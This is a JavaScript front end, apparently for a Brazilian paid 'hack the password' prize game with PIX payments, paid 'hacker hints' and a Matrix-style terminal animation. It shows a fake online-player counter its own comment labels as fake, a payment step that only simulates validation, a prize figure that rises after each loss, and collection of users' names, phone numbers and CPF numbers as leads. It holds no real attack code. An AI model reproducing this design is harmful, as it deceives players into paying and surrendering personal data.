// --- CONFIGURAÇÃO DE SONS ---
const sfx = {
    type: document.getElementById('sfx-type'),
    error: document.getElementById('sfx-error'),
    win: document.getElementById('sfx-win')
};

function play(sound) {
    if (sound) { sound.currentTime = 0; sound.play().catch(() => {}); }
}

// --- EFEITO VIBRAR (Haptic Feedback) ---
function vibrar(ms = 50) {
    // Tenta vibrar se o navegador permitir
    if (navigator.vibrate) navigator.vibrate(ms);
}

// --- EFEITO MATRIX (COM TRANSPARÊNCIA PARA O FUNDO) ---
const canvas = document.getElementById('matrix-canvas');
const ctx = canvas.getContext('2d');

function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

const chars = '01XYZ$#@%&£€₹'; // Caracteres mais "hacker"
const fontSize = 14;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function drawMatrix() {
    // IMPORTANTE: O fillStyle tem transparência baixa (0.05)
    // Isso cria o efeito de rastro e permite que a imagem de fundo apareça.
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; 
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    ctx.fillStyle = '#22c55e'; // Cor verde do código
    ctx.font = fontSize + 'px monospace';
    
    for (let i = 0; i < drops.length; i++) {
        const text = chars.charAt(Math.floor(Math.random() * chars.length));
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}
// Roda a animação a cada 50ms
setInterval(drawMatrix, 50);

// --- INICIALIZAÇÃO E MÁSCARAS ---
$(document).ready(() => {
    $('#input-tel').mask('(00) 00000-0000');
    $('#input-cpf').mask('000.000.000-00');
});

// --- DADOS DO USUÁRIO ---
let usuario = JSON.parse(localStorage.getItem('openpix_user')) || null;
let historico = JSON.parse(localStorage.getItem('openpix_history')) || [];
let tokenVitoriaAtual = "";

// --- FUNÇÕES DE INTERFACE (UI) ---
function fecharModal(id) { document.getElementById(id).classList.add('hidden'); }

function abrirDicas() {
    vibrar(); // Feedback tátil
    let textoPremio = $('#premio').text().replace('.', '').replace(',', '.');
    let valorPremio = parseFloat(textoPremio);

    // Calcula preços dinâmicos
    let p1 = valorPremio * 0.05; 
    let p2 = valorPremio * 0.15; 
    let p3 = valorPremio * 0.50; 

    $('#val-dica-1').text('R$ ' + p1.toLocaleString('pt-BR', {minimumFractionDigits: 2}));
    $('#val-dica-2').text('R$ ' + p2.toLocaleString('pt-BR', {minimumFractionDigits: 2}));
    $('#val-dica-3').text('R$ ' + p3.toLocaleString('pt-BR', {minimumFractionDigits: 2}));

    $('#btn-dica-1').attr('onclick', `comprarDica(1, ${p1.toFixed(2)}, 'Dica Nível 1')`);
    $('#btn-dica-2').attr('onclick', `comprarDica(2, ${p2.toFixed(2)}, 'Dica Nível 2')`);
    $('#btn-dica-3').attr('onclick', `comprarDica(3, ${p3.toFixed(2)}, 'Dica Nível 3')`);

    document.getElementById('modal-dicas').classList.remove('hidden');
}

function verificarLogin() {
    vibrar();
    if (document.getElementById('senha').value.length !== 4) {
        // Alerta bonito (SweetAlert) em vez de nativo
        Swal.fire({
            icon: 'warning',
            title: 'Senha Inválida',
            text: 'A senha deve ter exatamente 4 dígitos.',
            confirmButtonText: 'Entendi'
        });
        return;
    }
    if (!usuario) document.getElementById('modal-cadastro').classList.remove('hidden');
    else document.getElementById('modal-planos').classList.remove('hidden');
}

function salvarCadastro(e) {
    e.preventDefault();
    vibrar();
    usuario = { nome: $('#input-nome').val(), tel: $('#input-tel').val(), cpf: $('#input-cpf').val() };
    localStorage.setItem('openpix_user', JSON.stringify(usuario));
    
    fetch('/salvar-lead', { 
        method: 'POST', 
        headers: {'Content-Type': 'application/json'}, 
        body: JSON.stringify(usuario) 
    });

    fecharModal('modal-cadastro');
    Swal.fire({ icon: 'success', title: 'Cadastro Salvo', timer: 1500, showConfirmButton: false });
    document.getElementById('modal-planos').classList.remove('hidden');
}

function selecionarPlano(valor, chances, plano) {
    vibrar();
    fecharModal('modal-planos');
    $('#btn-texto').html('<i class="fas fa-sync fa-spin"></i> VALIDANDO PAGAMENTO...');
    
    // Simula delay de pagamento PIX
    setTimeout(() => {
        fetch('/registrar-venda', { 
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({ valor, plano }) 
        });
        // Inicia a tentativa automaticamente após "pagar"
        iniciarHack();
    }, 2000);
}

async function comprarDica(nivel, valor, plano) {
    fecharModal('modal-dicas');
    
    // Confirmação com SweetAlert
    const result = await Swal.fire({
        title: 'Confirmar Compra da Dica?',
        text: `O valor de R$ ${valor} será descontado.`,
        icon: 'question',
        showCancelButton: true,
        confirmButtonText: 'Sim, Comprar',
        cancelButtonText: 'Cancelar'
    });

    if(result.isConfirmed) {
        vibrar(100);
        const res = await fetch('/comprar-dica', { 
            method: 'POST', 
            headers: {'Content-Type': 'application/json'}, 
            body: JSON.stringify({ nivel, valor, plano }) 
        });
        const data = await res.json();
        
        $('#terminal').removeClass('hidden').css('opacity', '1').empty();
        log(`EXECUTANDO SCRIPT DE DICA NÍVEL ${nivel}...`, "#eab308");
        await new Promise(r => setTimeout(r, 1000));
        log(`DADOS OBTIDOS: [ ${data.dica} ]`, "#fff");
        
        Swal.fire({
            title: 'DICA HACKER RECEBIDA',
            html: `A senha contém os números: <br><b style="font-size:2em; color:#4ade80">${data.dica}</b>`,
            icon: 'success'
        });
    }
}

// --- FUNÇÃO PARA ANIMAR NÚMEROS (Contador do Prêmio) ---
function animarValor(elementoId, valorFinal) {
    const elemento = document.getElementById(elementoId);
    if (!elemento) return;
    
    // Limpa o valor atual para pegar apenas o número
    let valorInicial = parseFloat(elemento.innerText.replace(/[^\d,]/g, '').replace(',', '.'));
    if (isNaN(valorInicial)) valorInicial = 0;
    
    const duracao = 1500; // Duração da animação em ms
    const inicio = performance.now();
    
    requestAnimationFrame(function step(timestamp) {
        const progresso = (timestamp - inicio) / duracao;
        if (progresso < 1) {
            const valorAtual = valorInicial + (valorFinal - valorInicial) * progresso;
            // Formata como moeda BRL durante a animação
            elemento.innerText = valorAtual.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            requestAnimationFrame(step);
        } else {
            // Valor final exato
            elemento.innerText = valorFinal.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        }
    });
}

// --- LÓGICA PRINCIPAL DO JOGO ---
async function log(m, c = "#4ade80") {
    play(sfx.type);
    const line = $(`<div class="log-line" style="color:${c}"><i class="fas fa-terminal"></i> ${m}</div>`);
    $('#terminal').append(line);
    $('#terminal').scrollTop($('#terminal')[0].scrollHeight);
}

async function iniciarHack() {
    vibrar(); // Vibra ao começar
    const senhaTentativa = $('#senha').val();
    $('#btn-acao').prop('disabled', true);
    $('#terminal').removeClass('hidden').css('opacity', '1').empty();
    
    await log(`Iniciando conexão brute-force...`);
    await new Promise(r => setTimeout(r, 600));
    await log(`Testando hash: [ ${senhaTentativa} ]`);
    await new Promise(r => setTimeout(r, 800));

    const res = await fetch('/tentar', { 
        method: 'POST', 
        headers: {'Content-Type': 'application/json'}, 
        body: JSON.stringify({ senha: senhaTentativa }) 
    });
    const data = await res.json();

    historico.push({ senha: senhaTentativa, ganhou: data.ganhou, data: new Date().toLocaleString('pt-BR') });
    localStorage.setItem('openpix_history', JSON.stringify(historico));

    if (data.ganhou) {
        // VITÓRIA
        play(sfx.win);
        vibrar([200, 100, 200]); // Padrão de vibração de vitória
        tokenVitoriaAtual = data.token;
        await log("SENHA CORRETA! FIREWALL DERRUBADO.", "#fbbf24");
        
        $('#valor-vitoria').text(data.premio.toLocaleString('pt-BR', { minimumFractionDigits: 2 }));
        setTimeout(() => { document.getElementById('modal-vitoria').classList.remove('hidden'); }, 1000);

    } else {
        // DERROTA
        play(sfx.error);
        vibrar(300); // Vibração de erro mais longa
        await log("FALHA. SENHA INCORRETA. ALARME ACIONADO.", "#ef4444");
        $('body').addClass('shake');
        
        // Anima o prêmio subindo
        animarValor('premio', data.novoPremio);
        
        setTimeout(() => {
            $('body').removeClass('shake');
            $('#terminal').css('opacity', '0').addClass('hidden');
            $('#senha').val('').prop('disabled', false).focus();
            $('#btn-acao').prop('disabled', false);
            $('#btn-texto').html('<i class="fas fa-unlock-alt"></i> TENTAR NOVAMENTE'); 
        }, 2000);
    }
}

// --- SOLICITAÇÃO DE SAQUE ---
async function solicitarSaque() {
    vibrar();
    const pix = $('#pix-vitoria').val();
    
    if(!pix) {
        Swal.fire({ icon: 'error', title: 'Erro', text: 'Por favor, informe a Chave PIX.' });
        return;
    }
    
    const valor = parseFloat($('#valor-vitoria').text().replace('.','').replace(',','.'));
    
    await fetch('/solicitar-saque', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            token: tokenVitoriaAtual,
            pix: pix,
            nome: usuario.nome,
            cpf: usuario.cpf,
            valor: valor
        })
    });

    document.getElementById('modal-vitoria').classList.add('hidden');
    
    Swal.fire({
        icon: 'success',
        title: 'SOLICITAÇÃO ENVIADA!',
        html: 'O valor de <b>R$ '+valor.toLocaleString('pt-BR', {minimumFractionDigits: 2})+'</b> será creditado em breve.',
        confirmButtonText: 'OK',
        confirmButtonColor: '#eab308'
    }).then(() => {
        location.reload(); // Recarrega para reiniciar o jogo
    });
}

function abrirHistorico() {
    vibrar();
    const lista = $('#lista-historico').empty();
    if (!historico.length) {
        lista.html('<p class="text-center text-slate-500 mt-10 text-xs">Nenhum palpite registrado ainda.</p>');
    } else {
        // Mostra o histórico do mais recente para o mais antigo
        historico.slice().reverse().forEach(h => {
            lista.append(`
                <div class="bg-black/50 p-3 rounded-lg border border-slate-800 flex justify-between items-center mb-2 font-mono">
                    <span class="text-white tracking-widest">${h.senha}</span>
                    <span class="text-[9px] font-bold px-2 py-1 rounded ${h.ganhou ? 'bg-green-500 text-black' : 'bg-red-900/50 text-red-500'}">
                        ${h.ganhou ? 'SUCESSO' : 'FALHA'}
                    </span>
                </div>
            `);
        });
    }
    document.getElementById('modal-historico').classList.remove('hidden');
}

// --- CONTADOR ONLINE FAKE (Só para movimento) ---
const contadorEl = document.getElementById('contador-online');
setInterval(() => {
    let atual = parseInt(contadorEl.innerText);
    let variacao = Math.floor(Math.random() * 5) - 2; 
    let novo = atual + variacao;
    if (novo < 120) novo = 120; 
    contadorEl.innerText = novo;
}, 4000);
